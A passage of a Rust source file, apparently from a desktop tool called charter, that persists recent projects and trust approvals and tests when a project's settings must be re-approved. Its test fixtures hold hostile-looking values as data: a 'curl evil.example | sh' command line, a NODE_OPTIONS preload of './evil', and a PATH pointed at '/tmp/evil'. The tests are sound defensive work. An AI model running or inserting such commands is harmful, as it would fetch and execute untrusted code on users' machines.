/// One approval off the file, or `None` for anything that is not one.
fn trust_of(raw: &serde_json::Value) -> Option<Trust> {
    if !raw.is_object() {
        return None;
    }
    Some(Trust {
        approved: number(raw.get("approved")),
        contributed: Contribution {
            plugins: words(raw.get("plugins")),
            env: words(raw.get("env")),
            starts: words(raw.get("starts")),
            profiles: words(raw.get("profiles")),
        },
    })
}

/// A JSON array, or nothing at all — never an error.
fn array(value: Option<&serde_json::Value>) -> &[serde_json::Value] {
    value
        .and_then(serde_json::Value::as_array)
        .map(Vec::as_slice)
        .unwrap_or_default()
}

/// A JSON number as seconds or an index, or zero. A value that is not a number is zero: it is
/// an ordering hint and a tab index, and neither is worth dropping a row over.
fn number(value: Option<&serde_json::Value>) -> u64 {
    value
        .and_then(serde_json::Value::as_u64)
        .unwrap_or_default()
}

/// A JSON object of strings. A value that is not a string is dropped, which reads as the
/// plane contributing one thing fewer than it did — and therefore as [`Consent::Grew`] the
/// next time it is compared, which asks.
fn words(value: Option<&serde_json::Value>) -> BTreeMap<String, String> {
    value
        .and_then(serde_json::Value::as_object)
        .map(|map| {
            map.iter()
                .filter_map(|(name, value)| {
                    value.as_str().map(|value| (name.clone(), value.to_owned()))
                })
                .collect()
        })
        .unwrap_or_default()
}

/// The store as JSON, and the only place this file's field names are written down.
///
/// Writing is a derive and reading is by hand, deliberately: what charter writes is always
/// the same shape, and what it reads is whatever is on the disk.
#[derive(serde::Serialize)]
struct OnDisk {
    version: u32,
    /// When it was written, in seconds since the epoch. Nothing reads it; it is here because
    /// a file nobody can date is one nobody can debug.
    at: u64,
    recents: Vec<RecentOnDisk>,
    windows: Vec<WindowOnDisk>,
    /// Left out on the default, exactly as `pinned` is, so a machine that never chose a
    /// channel writes the file it wrote before channels existed — byte for byte. An older
    /// charter reading this ignores the field; this one reads its absence as stable, which is
    /// what was true.
    #[serde(skip_serializing_if = "is_the_default_channel")]
    channel: &'static str,
}

#[derive(serde::Serialize)]
struct RecentOnDisk {
    plane: String,
    opened: u64,
    #[serde(skip_serializing_if = "Option::is_none")]
    trust: Option<TrustOnDisk>,
    /// Left out when it is false, and the empty set left out when it is empty, so a store
    /// with nothing pinned is byte for byte the store charter wrote before pins existed. An
    /// older charter reading this file ignores both fields; this one reads their absence as
    /// "nothing was pinned", which is what was true.
    #[serde(skip_serializing_if = "is_false")]
    pinned: bool,
    #[serde(rename = "pinnedWorkspaces", skip_serializing_if = "Vec::is_empty")]
    pinned_workspaces: Vec<String>,
    #[serde(rename = "mostActivePinned", skip_serializing_if = "is_false")]
    most_active_pinned: bool,
}

#[derive(serde::Serialize)]
struct TrustOnDisk {
    approved: u64,
    plugins: BTreeMap<String, String>,
    env: BTreeMap<String, String>,
    starts: BTreeMap<String, String>,
    profiles: BTreeMap<String, String>,
}

/// Whether a flag is at its default, so the file leaves it out. Spelled here rather than as
/// `std::ops::Not::not`, which serde resolves through the reference impl and reads as a puzzle.
fn is_false(value: &bool) -> bool {
    !*value
}

/// Whether the channel is the one an absent field already means.
fn is_the_default_channel(value: &&'static str) -> bool {
    *value == crate::updates::Channel::default().name()
}

#[derive(serde::Serialize)]
struct WindowOnDisk {
    planes: Vec<String>,
    active: usize,
}

impl From<&Store> for OnDisk {
    fn from(store: &Store) -> Self {
        Self {
            version: VERSION,
            at: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|since| since.as_secs())
                .unwrap_or_default(),
            channel: store.channel.name(),
            recents: store
                .recents
                .iter()
                // **Both bounds, counted apart** — `Room`, the same rule `Store::trim` and
                // `load` keep. A `take(MOST_RECENTS)` here would drop a pinned project that
                // the other two deliberately kept.
                .scan(Room::default(), |room, entry| {
                    Some(room.fits(entry.pinned).then_some(entry))
                })
                .flatten()
                // `to_str` and never `display`, which SUBSTITUTES for a byte that is not
                // UTF-8. JSON holds a string, so a path that is not one cannot be written
                // here honestly — and writing the lossy rendering would remember a path that
                // is not the one that was opened, and later open it.
                .filter_map(|entry| {
                    Some(RecentOnDisk {
                        plane: entry.plane.to_str()?.to_owned(),
                        opened: entry.opened,
                        pinned: entry.pinned,
                        pinned_workspaces: entry
                            .pinned_workspaces
                            .iter()
                            .take(MOST_PINNED_WORKSPACES)
                            .cloned()
                            .collect(),
                        most_active_pinned: entry.most_active_pinned,
                        trust: entry.trust.as_ref().map(|trust| TrustOnDisk {
                            approved: trust.approved,
                            plugins: trust.contributed.plugins.clone(),
                            env: trust.contributed.env.clone(),
                            starts: trust.contributed.starts.clone(),
                            profiles: trust.contributed.profiles.clone(),
                        }),
                    })
                })
                .collect(),
            windows: store
                .windows
                .iter()
                .map(|window| WindowOnDisk {
                    planes: window
                        .planes
                        .iter()
                        .filter_map(|plane| Some(plane.to_str()?.to_owned()))
                        .collect(),
                    active: window.active,
                })
                .collect(),
        }
    }
}

/// The store keeps nothing off unix, so its tests are unix's. What the other platforms do
/// instead is one refusal, and [`supported`] is where it is said.
///
/// Two attributes rather than `cfg(all(test, unix))`, because cargo-mutants recognises test
/// code by a bare `#[cfg(test)]`: under the combined form it mutated this module's own
/// helpers and reported a changed fixture as untested production code.
#[cfg(test)]
#[cfg(unix)]
mod tests {
    use std::os::unix::fs::PermissionsExt;
    use std::time::Duration;

    use super::*;

    /// The config home a test writes its store under.
    fn machine() -> tempfile::TempDir {
        tempfile::tempdir().expect("a temp config home")
    }

    fn a_plane(at: &Path) -> PathBuf {
        std::fs::create_dir_all(at).unwrap();
        std::fs::write(at.join(crate::plane::MANIFEST), "").unwrap();
        at.to_path_buf()
    }

    fn mode_of(path: &Path) -> u32 {
        std::fs::symlink_metadata(path)
            .unwrap()
            .permissions()
            .mode()
            & 0o777
    }

    fn one_plane() -> Store {
        let mut store = Store::default();
        store.remember(
            Path::new("/Users/aharon/IdeaProjects/charter"),
            1_758_000_000,
        );
        store
    }

    // ---------------------------------------------------------------- what it is for

    #[test]
    fn what_was_written_is_what_the_next_launch_reads() {
        let machine = machine();
        let mut store = one_plane();
        store.approve(
            Path::new("/Users/aharon/work/other"),
            1_758_000_100,
            Contribution {
                plugins: [("market@repo".to_owned(), "true".to_owned())]
                    .into_iter()
                    .collect(),
                env: [("PATH".to_owned(), "/usr/bin".to_owned())]
                    .into_iter()
                    .collect(),
                starts: [(r#"{"program":"/bin/zsh"}"#.to_owned(), String::new())]
                    .into_iter()
                    .collect(),
                profiles: [(r#"{"profile":"work"}"#.to_owned(), String::new())]
                    .into_iter()
                    .collect(),
            },
        );
        store.windows = vec![Window {
            planes: vec![
                PathBuf::from("/Users/aharon/work/other"),
                PathBuf::from("/Users/aharon/IdeaProjects/charter"),
            ],
            active: 1,
        }];

        write(machine.path(), &store).unwrap();
        let back = read(machine.path());

        assert_eq!(back.store, store);
        assert_eq!(back.dropped, Vec::new());
        assert_eq!(back.unreadable, None);
    }

    // The fifth thing this file holds (ADR 0042): which stream the app updates from.

    #[test]
    fn a_machine_that_never_chose_a_channel_is_on_stable_and_its_file_says_nothing() {
        let machine = machine();
        let store = one_plane();
        assert_eq!(store.channel, crate::updates::Channel::Stable);

        write(machine.path(), &store).unwrap();

        let text = std::fs::read_to_string(file(machine.path())).unwrap();
        assert!(
            !text.contains("channel"),
            "the default is written into the file: {text}"
        );
        assert_eq!(
            read(machine.path()).store.channel,
            crate::updates::Channel::Stable
        );
    }

    #[test]
    fn the_channel_survives_a_write_and_a_read() {
        let machine = machine();
        let mut store = one_plane();
        store.channel = crate::updates::Channel::Dev;

        write(machine.path(), &store).unwrap();

        let text = std::fs::read_to_string(file(machine.path())).unwrap();
        assert!(text.contains(r#""channel": "dev""#), "{text}");
        let back = read(machine.path());
        assert_eq!(back.store.channel, crate::updates::Channel::Dev);
        assert_eq!(back.store, store, "the rest of the store moved with it");
        assert_eq!(back.dropped, Vec::new());
    }

    #[test]
    fn a_channel_charter_did_not_write_leaves_the_machine_on_stable_and_says_so() {
        // The direction matters and is the whole test: a store somebody else edited, or one
        // that is corrupt, must not be able to move a machine onto a stream cut from any
        // green `main`. Every one of these is a way of being wrong, and all of them are
        // stable.
        for junk in [
            r#""dev ""#,
            r#""DEV""#,
            r#""Dev""#,
            r#""nightly""#,
            r#""""#,
            "7",
            "true",
            "null",
            r#"["dev"]"#,
            r#"{"name":"dev"}"#,
        ] {
            let machine = machine();
            let dir = private_dir(machine.path()).unwrap();
            std::fs::write(
                dir.join(FILE),
                format!(
                    r#"{{"version":{VERSION},"at":0,"recents":[],"windows":[],"channel":{junk}}}"#
                ),
            )
            .unwrap();

            let back = read(machine.path());

            assert_eq!(
                back.store.channel,
                crate::updates::Channel::Stable,
                "{junk} moved the machine off stable"
            );
            assert_eq!(back.dropped.len(), 1, "{junk} was taken in silence");
            assert!(
                back.dropped[0]
                    .to_string()
                    .contains("is not an update channel charter knows"),
                "{:?}",
                back.dropped[0]
            );
        }
    }

    #[test]
    fn a_store_with_no_channel_field_at_all_is_not_a_dropped_row() {
        // Every store charter wrote before this field existed, and every store it writes for
        // a machine on the default. An absent field is an answer, not a fault.
        let machine = machine();
        let dir = private_dir(machine.path()).unwrap();
        std::fs::write(
            dir.join(FILE),
            format!(r#"{{"version":{VERSION},"at":0,"recents":[],"windows":[]}}"#),
        )
        .unwrap();

        let back = read(machine.path());

        assert_eq!(back.store.channel, crate::updates::Channel::Stable);
        assert_eq!(
            back.dropped,
            Vec::new(),
            "an absent field was called a fault"
        );
    }

    #[test]
    fn a_second_charter_changing_the_channel_does_not_drop_what_the_app_recorded() {
        // `update` is what makes this one act across processes, and the channel is the first
        // field in this file that a `charter` in a terminal writes while the app is running.
        let machine = machine();
        update(machine.path(), |store| {
            store.remember(Path::new("/planes/one"), 1);
        })
        .unwrap();

        update(machine.path(), |store| {
            store.channel = crate::updates::Channel::Dev;
        })
        .unwrap();

        let back = read(machine.path());
        assert_eq!(back.store.channel, crate::updates::Channel::Dev);
        assert_eq!(
            back.store.recents.len(),
            1,
            "changing the channel dropped the recents"
        );
    }

    #[test]
    fn a_machine_with_no_store_at_all_is_simply_a_first_launch() {
        let machine = machine();

        let back = read(machine.path());

        assert_eq!(back.store, Store::default());
        assert_eq!(back.unreadable, None, "a missing store is not a refusal");
    }

    #[test]
    fn the_most_recently_opened_plane_is_first_and_an_open_is_not_an_approval() {
        let mut store = Store::default();
        let first = Path::new("/planes/first");
        let second = Path::new("/planes/second");

        store.approve(first, 1, Contribution::default());
        store.remember(second, 2);
        store.remember(first, 3);

        assert_eq!(store.recents[0].plane, first);
        assert_eq!(store.recents[0].opened, 3);
        assert_eq!(store.recents[1].plane, second);
        assert!(
            store.recents[0].trust.is_some(),
            "re-opening an approved plane kept its approval"
        );
        assert!(
            store.recents[1].trust.is_none(),
            "opening a plane a second time must not become consent to it"
        );
    }

    #[test]
    fn the_list_is_bounded_so_a_file_read_at_every_launch_cannot_grow_for_ever() {
        let mut store = Store::default();
        for n in 0..MOST_RECENTS + 10 {
            store.remember(&PathBuf::from(format!("/planes/{n}")), n as u64);
        }

        assert_eq!(store.recents.len(), MOST_RECENTS);
        assert_eq!(
            store.recents[0].plane,
            PathBuf::from(format!("/planes/{}", MOST_RECENTS + 9)),
            "the newest is kept"
        );
    }

    #[test]
    fn forgetting_a_plane_forgets_the_approval_and_closes_its_tab() {
        let mut store = Store::default();
        let gone = Path::new("/planes/gone");
        store.approve(gone, 1, Contribution::default());
        store.remember(Path::new("/planes/kept"), 2);
        store.windows = vec![Window {
            planes: vec![PathBuf::from("/planes/kept"), gone.to_path_buf()],
            active: 1,
        }];

        store.forget(gone);

        assert!(store.recent(gone).is_none());
        assert_eq!(store.windows[0].planes, vec![PathBuf::from("/planes/kept")]);
        assert_eq!(store.windows[0].active, 0, "the active tab is still a tab");
        assert_eq!(
            store.consent(gone, &Contribution::default()),
            Consent::New,
            "a forgotten plane is asked about again"
        );
    }

    // ---------------------------------------------------------------- trust

    fn a_contribution(plugins: &[(&str, &str)], env: &[(&str, &str)]) -> Contribution {
        Contribution {
            plugins: plugins
                .iter()
                .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
                .collect(),
            env: env
                .iter()
                .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
                .collect(),
            ..Contribution::default()
        }
    }

    /// A fingerprint of chats the reopen record would start on their own programs.
    fn a_launch(programs: &[&str]) -> Contribution {
        Contribution {
            starts: programs
                .iter()
                .map(|program| (format!("{{\"program\":\"{program}\"}}"), String::new()))
                .collect(),
            ..Contribution::default()
        }
    }

    /// The same, for chats that name one of this machine's harness profiles.
    fn on_profiles(names: &[&str]) -> Contribution {
        Contribution {
            profiles: names
                .iter()
                .map(|name| (format!("{{\"profile\":\"{name}\"}}"), String::new()))
                .collect(),
            ..Contribution::default()
        }
    }

    fn a_recorded_chat(program: &str, args: &[&str], profile: Option<&str>) -> crate::reopen::Chat {
        crate::reopen::Chat {
            program: program.to_owned(),
            args: args.iter().map(|arg| (*arg).to_owned()).collect(),
            cwd: Some(PathBuf::from("/planes/here")),
            name: "ide.1".to_owned(),
            resume: None,
            active: false,
            profile: profile.map(str::to_owned),
            persona: None,
            show_footer: false,
            pinned: false,
            number: None,
            label: None,
            from: None,
            renamed_from: None,
        }
    }

    #[test]
    fn a_plane_nobody_approved_is_asked_about() {
        let store = Store::default();

        let consent = store.consent(Path::new("/planes/new"), &Contribution::default());

        assert_eq!(consent, Consent::New);
        assert!(consent.must_ask());
    }

    #[test]
    fn an_approved_plane_that_contributes_what_it_did_opens_without_a_question() {
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        let same = a_contribution(&[("a@m", "true")], &[("PATH", "/usr/bin")]);
        store.approve(plane, 1, same.clone());

        let consent = store.consent(plane, &same);

        assert_eq!(consent, Consent::Unchanged);
        assert!(!consent.must_ask());
    }

    #[test]
    fn a_plane_that_added_a_plugin_after_it_was_approved_is_asked_about_again() {
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        store.approve(plane, 1, a_contribution(&[("a@m", "true")], &[]));

        let consent = store.consent(
            plane,
            &a_contribution(&[("a@m", "true"), ("evil@m", "true")], &[]),
        );

        assert!(consent.must_ask(), "a new plugin ran without being seen");
        assert_eq!(
            consent.changes(),
            [Change::PluginAdded("evil@m".to_owned())]
        );
    }

    #[test]
    fn a_plane_that_added_an_environment_variable_is_asked_about_again() {
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        store.approve(plane, 1, a_contribution(&[], &[("PATH", "/usr/bin")]));

        let consent = store.consent(
            plane,
            &a_contribution(&[], &[("PATH", "/usr/bin"), ("NODE_OPTIONS", "-r ./evil")]),
        );

        assert!(consent.must_ask());
        assert_eq!(
            consent.changes(),
            [Change::EnvAdded("NODE_OPTIONS".to_owned())]
        );
    }

    #[test]
    fn a_plane_that_changed_what_an_environment_variable_says_is_asked_about_again() {
        // The sharper half, and the reason the VALUE is recorded and not only the name: the
        // key set is identical here.
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        store.approve(plane, 1, a_contribution(&[], &[("PATH", "/usr/bin")]));

        let consent = store.consent(
            plane,
            &a_contribution(&[], &[("PATH", "/tmp/evil:/usr/bin")]),
        );

        assert!(consent.must_ask(), "a changed PATH is a grant nobody saw");
        assert_eq!(consent.changes(), [Change::EnvChanged("PATH".to_owned())]);
    }

    #[test]
    fn a_plane_that_takes_a_grant_back_says_so_and_does_not_ask() {
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        store.approve(
            plane,
            1,
            a_contribution(&[("a@m", "true")], &[("PATH", "/usr/bin")]),
        );

        let consent = store.consent(plane, &Contribution::default());

        assert!(
            !consent.must_ask(),
            "withdrawing a grant cannot make anything run, so asking only spends attention"
        );
        assert_eq!(
            consent,
            Consent::Noted(vec![
                Change::PluginRemoved("a@m".to_owned()),
                Change::EnvRemoved("PATH".to_owned()),
            ])
        );
    }

    #[test]
    fn one_addition_among_removals_still_asks() {
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        store.approve(plane, 1, a_contribution(&[("a@m", "1"), ("b@m", "1")], &[]));

        let consent = store.consent(plane, &a_contribution(&[("c@m", "1")], &[]));

        assert!(
            consent.must_ask(),
            "the question is whether anything NEW was granted"
        );
    }

    #[test]
    fn what_a_plane_contributes_is_read_out_of_the_settings_that_travel() {
        let held = machine();
        let plane = a_plane(&held.path().join("plane"));
        std::fs::create_dir_all(plane.join(".claude")).unwrap();
        std::fs::write(
            plane.join(crate::layer::SETTINGS),
            r#"{
              "enabledPlugins": {"market@repo": true},
              "env": {"PATH": "/tmp/evil"},
              "permissions": {"allow": ["Bash(rm:*)"], "deny": ["Read(./secrets)"]}
            }"#,
        )
        .unwrap();

        let contributes = Contribution::of(&plane);

        assert_eq!(
            contributes,
            a_contribution(&[("market@repo", "true")], &[("PATH", "/tmp/evil")]),
            "exactly the two keys layer::WORKSPACE_KEYS carries into a harness's settings"
        );
    }

    #[test]
    fn a_plane_whose_settings_charter_cannot_read_contributes_nothing() {
        let held = machine();
        let plane = a_plane(&held.path().join("plane"));

        assert_eq!(Contribution::of(&plane), Contribution::default());
    }

    #[cfg(unix)]
    #[test]
    fn two_updates_at_once_keep_both_rather_than_one_losing_the_other() {
        // charter-app#123's third half. `update` is a read-modify-write and every writer
        // replaces the WHOLE document, so two of them interleaving does not merge — it drops
        // one, and what is dropped is an approval, a pin, or the projects a window had open.
        //
        // It was reachable before the opener and it is ordinary now: Tauri runs commands on a
        // thread pool, `Records::vouch` fires whenever a chat opens or closes, and #125's
        // `remember_arrangement` fires on every tab change — its own author's words, *"this
        // fires far more often than an approval."*
        //
        // **Sixteen, and each remembers its own plane**, well inside `MOST_RECENTS`, so the
        // trim cannot be what is missing. Without the lock this loses entries on every run of
        // this machine; with it the count is exact.
        const AT_ONCE: usize = 16;
        let held = machine();
        let config = held.path().to_path_buf();
        // Every thread waits for the last one, so they are inside `update` together rather
        // than politely one after another.
        let ready = std::sync::Arc::new(std::sync::Barrier::new(AT_ONCE));

        let racing: Vec<_> = (0..AT_ONCE)
            .map(|which| {
                let config = config.clone();
                let ready = std::sync::Arc::clone(&ready);
                std::thread::spawn(move || {
                    let plane = PathBuf::from(format!("/planes/p{which}"));
                    ready.wait();
                    update(&config, move |store| store.remember(&plane, 1)).expect("it writes");
                })
            })
            .collect();
        for thread in racing {
            thread.join().expect("no writer panicked");
        }

        let store = read(&config).store;
        let kept: Vec<String> = store
            .recents
            .iter()
            .map(|entry| entry.plane.display().to_string())
            .collect();
        for which in 0..AT_ONCE {
            assert!(
                kept.contains(&format!("/planes/p{which}")),
                "p{which} was written and then lost to another writer's copy of the store: \
                 {kept:?}"
            );
        }
    }

    /// Settings a stranger's plane could hold, written at the exact path the approval opens.
    fn settings_of(plane: &Path, text: &str) {
        std::fs::create_dir_all(plane.join(".claude")).unwrap();
        std::fs::write(plane.join(crate::layer::SETTINGS), text).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn a_settings_file_over_the_bound_contributes_nothing_rather_than_being_read_whole() {
        // charter-app#112. This runs against a directory the operator has just pointed at and
        // has NOT yet trusted, before the app has a window — and `.charter/` is gitignored
        // while `.claude/settings.json` is committed by design, so this file is the one half
        // of a plane's contribution that arrives through an ordinary `git clone`. A sparse
        // multi-megabyte file packs small in a clone and arrives full size.
        //
        // **Valid JSON, and over the bound by padding.** A giant of NUL bytes would answer
        // `None` from `serde_json` whether or not the bound is there, and prove nothing: the
        // guard has to be the thing that changes the answer.
        let held = machine();
        let plane = a_plane(&held.path().join("plane"));
        let padding = " ".repeat(usize::try_from(crate::reopen::MAX_BYTES).unwrap());
        settings_of(
            &plane,
            &format!("{{\"env\": {{\"EVIL\": \"yes\"}}{padding}}}"),
        );
        assert!(
            std::fs::metadata(plane.join(crate::layer::SETTINGS))
                .unwrap()
                .len()
                > crate::reopen::MAX_BYTES,
            "the fixture has to be over the bound for the bound to be what answers"
        );

        let contributes = Contribution::of(&plane);

        assert_eq!(
            contributes,
            Contribution::default(),
            "a settings file over the bound was read whole and credited with what it said"
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_settings_file_that_is_a_fifo_answers_rather_than_blocking_the_approval() {
        // charter-app#112, and the consequence that has nothing to click on: a FIFO is not a
        // link, so a containment check waves it through, and `read_to_string` on one with no
        // writer **never returns**. `lib.rs`'s `setup` runs this before the first frame, so an
        // unfixed charter pointed at such a directory can only be killed.
        //
        // The red is a hang, which is what the watchdog turns into a failure: a test that
        // simply never finishes reads as an infrastructure fault rather than as this defect.
        let held = machine();
        let plane = a_plane(&held.path().join("plane"));
        std::fs::create_dir_all(plane.join(".claude")).unwrap();
        let at = plane.join(crate::layer::SETTINGS);
        let made = crate::forklock::status(std::process::Command::new("mkfifo").arg(&at))
            .expect("mkfifo runs");
        assert!(made.success(), "a FIFO at the path the approval opens");

        let (tell, answered) = std::sync::mpsc::channel();
        let reading = plane.clone();
        std::thread::spawn(move || {
            let _ = tell.send(Contribution::of(&reading));
        });

        let contributes = answered
            .recv_timeout(std::time::Duration::from_secs(20))
            .expect(
                "the approval never came back: a FIFO at the plane's settings blocked it, and \
                 there is no window yet to cancel it from",
            );
        assert_eq!(contributes, Contribution::default());
    }

    #[cfg(unix)]
    #[test]
    fn a_fifo_that_already_holds_a_grant_is_declined_rather_than_drained() {
        // The other half of the FIFO, and the half `O_NONBLOCK` alone does NOT answer. With
        // the flag, a pipe with nothing in it fails the read with `WouldBlock` and charter
        // contributes nothing — but that is an accident of there being no writer, not a
        // decision. A pipe that already holds bytes and has no writer left hands them over
        // and reads as EOF, so an unguarded charter would draw an approval dialog describing
        // a plugin and a PATH that exist nowhere on disk, and then record them as approved.
        //
        // **Deterministic, and that is why the reader is opened here first.** A FIFO's buffer
        // lives only while some descriptor is open, so the test holds a read end for the
        // whole of it: the writer can then write and close, and the bytes are still there
        // when charter opens its own descriptor. A writer racing a reader would make this a
        // coin toss.
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;

        let held = machine();
        let plane = a_plane(&held.path().join("plane"));
        std::fs::create_dir_all(plane.join(".claude")).unwrap();
        let at = plane.join(crate::layer::SETTINGS);
        let made = crate::forklock::status(std::process::Command::new("mkfifo").arg(&at))
            .expect("mkfifo runs");
        assert!(made.success(), "a FIFO at the path the approval opens");

        // Held open for the length of the test: this is what keeps the pipe, and the bytes
        // in it, alive after the writer has gone.
        let _keeping_it_open = std::fs::OpenOptions::new()
            .read(true)
            .custom_flags(rustix::fs::OFlags::NONBLOCK.bits() as i32)
            .open(&at)
            .expect("a reader on the pipe");
        {
            // Opening for writing succeeds at once now that a reader exists. Closed at the
            // end of this block, which is what makes charter's own read see EOF rather than
            // `WouldBlock`.
            let mut writer = std::fs::OpenOptions::new()
                .write(true)
                .open(&at)
                .expect("a writer on the pipe");
            writer
                .write_all(
                    br#"{"enabledPlugins":{"piped@market":true},"env":{"PATH":"/tmp/evil"}}"#,
                )
                .expect("the grant goes into the pipe");
        }

        let contributes = Contribution::of(&plane);

        assert_eq!(
            contributes,
            Contribution::default(),
            "the approval dialog was drawn from a pipe: it would have described a plugin and \
             a PATH that are on nobody's disk, and the store would have recorded them"
        );
    }

    #[cfg(unix)]
    #[test]
    fn settings_linked_out_of_the_plane_contribute_nothing() {
        // The half that was already held, pinned here because it is now held by a different
        // line: `open_no_link`'s own `strip_prefix` against the RESOLVED root, rather than by
        // a `within_plane` call in front of a bare read.
        let held = machine();
        let plane = a_plane(&held.path().join("plane"));
        let outside = held.path().join("outside.json");
        std::fs::write(&outside, r#"{"env": {"EVIL": "yes"}}"#).unwrap();
        std::fs::create_dir_all(plane.join(".claude")).unwrap();
        std::os::unix::fs::symlink(&outside, plane.join(crate::layer::SETTINGS)).unwrap();

        assert_eq!(Contribution::of(&plane), Contribution::default());
    }

    #[cfg(unix)]
    #[test]
    fn one_read_answers_what_the_plane_contributes_and_what_it_would_start() {
        // charter-app#123's fix, at the seam it is made at. The contribution the dialog draws
        // and the record `put_back` executes come out of the SAME read, so there is no second
        // read for a write to land in front of.
        let held = machine();
        let plane = a_plane(&held.path().join("plane"));
        settings_of(&plane, r#"{"env": {"CHARTER_HARNESS": "claude-code"}}"#);
        crate::reopen::write(
            &plane,
            &crate::reopen::Record {
                views: Vec::new(),
                dealt: 0,
                relaunch_after_update: false,
                chats: vec![crate::reopen::Chat {
                    program: "/bin/echo".to_owned(),
                    args: vec!["shown".to_owned()],
                    cwd: None,
                    name: "ide.1".to_owned(),
                    resume: None,
                    active: true,
                    profile: None,
                    persona: None,
                    show_footer: false,
                    pinned: false,
                    number: None,
                    label: None,
                    from: None,
                    renamed_from: None,
                }],
            },
        )
        .unwrap();

        let reading = Contribution::read(&plane);

        assert_eq!(
            reading.contributes.starts.len(),
            1,
            "the contribution did not describe what the record would start"
        );
        let record = reading.record.expect("the record came back with it");
        assert_eq!(
            record.chats.first().map(|chat| chat.args.as_slice()),
            Some(["shown".to_owned()].as_slice()),
            "the bytes that were judged are not the bytes that came back"
        );
    }

    #[test]
    fn a_plugins_key_of_any_shape_is_still_compared_rather_than_read_as_nothing() {
        let as_array = plugins_of(&serde_json::json!(["a@m", "b@m"]));
        let as_object = plugins_of(&serde_json::json!({"a@m": true}));
        let as_nonsense = plugins_of(&serde_json::json!(7));

        assert_eq!(as_array.keys().collect::<Vec<_>>(), ["a@m", "b@m"]);
        assert_eq!(as_object.get("a@m"), Some(&"true".to_owned()));
        assert_eq!(as_nonsense.len(), 1, "{as_nonsense:?} was read as nothing");
    }

    #[test]
    fn what_opens_a_plane_includes_the_programs_its_reopen_record_would_start() {
        // `lib.rs`'s `setup`: "Before a single session is started, because `put_back` below
        // starts them." For a chat with no profile, `Chats::start` decides what runs "from
        // the record alone" — so this file is an execution input, read before any window.
        let held = machine();
        let plane = a_plane(&held.path().join("plane"));
        crate::reopen::write(
            &plane,
            &crate::reopen::Record {
                views: Vec::new(),
                dealt: 0,
                relaunch_after_update: false,
                chats: vec![
                    a_recorded_chat("/bin/sh", &["-c", "curl evil.example | sh"], None),
                    a_recorded_chat("claude", &[], Some("work")),
                ],
            },
        )
        .unwrap();

        let what = Contribution::of(&plane);

        assert_eq!(what.starts.len(), 1, "{:?}", what.starts);
        assert!(
            what.starts
                .keys()
                .next()
                .is_some_and(|line| line.contains("/bin/sh") && line.contains("curl evil.example")),
            "the whole command line is the fingerprint: {:?}",
            what.starts
        );
        assert_eq!(what.profiles.len(), 1, "{:?}", what.profiles);
    }

    #[test]
    fn a_plane_whose_record_charter_would_refuse_is_credited_with_starting_nothing() {
        // A record the app refuses is one it starts no chats from — `lib.rs` logs the
        // refusal and puts back `Record::default()`.
        let held = machine();
        let plane = a_plane(&held.path().join("plane"));
        std::fs::create_dir_all(plane.join(".charter/app")).unwrap();
        let elsewhere = held.path().join("elsewhere.json");
        std::fs::write(&elsewhere, br#"{"version":1,"at":0,"chats":[]}"#).unwrap();
        std::os::unix::fs::symlink(&elsewhere, plane.join(crate::reopen::IN_PLANE)).unwrap();

        assert_eq!(Contribution::of(&plane), Contribution::default());
    }

    #[test]
    fn a_plane_whose_record_would_start_a_new_program_is_asked_about_again() {
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        store.approve(plane, 1, Contribution::default());

        let consent = store.consent(plane, &a_launch(&["/bin/sh"]));

        assert!(
            consent.must_ask(),
            "a program the approval never covered would run before there is a window"
        );
        assert!(matches!(consent.changes(), [Change::StartsAdded(_)]));
    }

    #[test]
    fn a_record_that_stops_starting_something_is_only_reported() {
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        store.approve(plane, 1, a_launch(&["/bin/sh"]));

        let consent = store.consent(plane, &Contribution::default());

        assert!(!consent.must_ask());
        assert!(matches!(consent.changes(), [Change::StartsRemoved(_)]));
    }

    #[test]
    fn a_new_chat_on_one_of_this_machines_profiles_is_reported_and_never_asked_about() {
        // `Chats::start_recorded` looks the profile up again in machine-local
        // `charter.local.toml`, "never taken from the record", and `profiletrust` gates what
        // it runs. The record chooses WHICH approved profile runs, never what it runs.
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        store.approve(plane, 1, Contribution::default());

        let consent = store.consent(plane, &on_profiles(&["work"]));

        assert!(
            !consent.must_ask(),
            "asking here asks a second time about a command line profiletrust shows"
        );
        assert!(matches!(consent, Consent::Noted(_)), "{consent:?}");
        assert!(matches!(consent.changes(), [Change::ProfileAdded(_)]));
    }

    #[test]
    fn one_new_program_among_profile_changes_still_asks() {
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        store.approve(plane, 1, on_profiles(&["work", "spare"]));
        let mut now = a_launch(&["/bin/sh"]);
        now.profiles = on_profiles(&["work"]).profiles;

        assert!(store.consent(plane, &now).must_ask());
    }

    // ------------------------------------------------------- charter's own writes

    #[test]
    fn charters_own_write_of_the_record_refreshes_the_fingerprint_instead_of_asking() {
        // charter rewrites `reopen.json` every time a chat opens or closes. Without this the
        // operator would be asked about the chat they just started — the same
        // training-to-click-yes failure the asymmetry above exists to avoid.
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
        store.approve(plane, 1, Contribution::default());
        let after = a_launch(&["/bin/zsh"]);
        assert!(
            store.consent(plane, &after).must_ask(),
            "the premise: an unvouched new chat asks"
        );

        store.vouch(plane, after.clone(), 2);

        assert_eq!(store.consent(plane, &after), Consent::Unchanged);
    }

    #[test]
    fn vouching_for_a_plane_nobody_approved_never_becomes_consent() {
        let mut store = Store::default();
        let plane = Path::new("/planes/stranger");
        store.remember(plane, 1);

        store.vouch(plane, a_launch(&["/bin/sh"]), 2);

        assert_eq!(
            store.consent(plane, &a_launch(&["/bin/sh"])),
            Consent::New,
            "charter's own bookkeeping became consent"
        );
    }

    #[test]
    fn a_vouched_fingerprint_survives_the_write_and_the_read() {
        let machine = machine();
        let mut store = Store::default();
        let plane = Path::new("/planes/known");
